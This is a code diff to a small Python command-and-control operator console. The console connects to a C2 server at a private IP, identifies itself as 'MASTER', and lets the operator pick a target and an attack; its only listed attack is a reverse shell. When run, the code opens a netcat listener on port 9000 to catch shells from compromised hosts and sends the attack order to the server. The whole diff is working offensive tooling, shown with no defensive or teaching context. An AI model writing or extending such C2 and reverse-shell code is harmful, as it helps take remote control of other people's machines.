@@ -8,6 +8,7 @@ class C2cmd(Cmd):
     def __init__(self):
         self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.s.connect(("192.168.1.134",7000))
+        self.s.send(b"MASTER")
         super().__init__()
         self.prompt = "(c&c) "
         self.target = ""
@@ -50,16 +51,20 @@ class C2cmd(Cmd):
         print("SYNTAX")
         print("\tselect [TARGET ID] [ATTACK ID]")
 
+    def do_info(self,args):
+        print(f"TARGET ID: {self.target}")
+        print(f"ATTACK ID: {self.attack}")
+
     def do_attacks(self,args):
         print("ATTACKS")
         print("[0] Reverse shell")
 
     def do_run(self,args):
         if self.attack == "0":
-            os.system('xterm -e "nc -lvnp 9000" &')
+            os.system('gnome-terminal -- nc -lvnp 9000')
         self.s.send(b'c')
         sleep(0.1)
-        self.s.send(self.target.encode("utf-8")+self.attack.encode("utf-8"))
+        self.s.send((self.target+self.attack).encode("utf-8"))
 
 if __name__ == "__main__":
     shell = C2cmd()
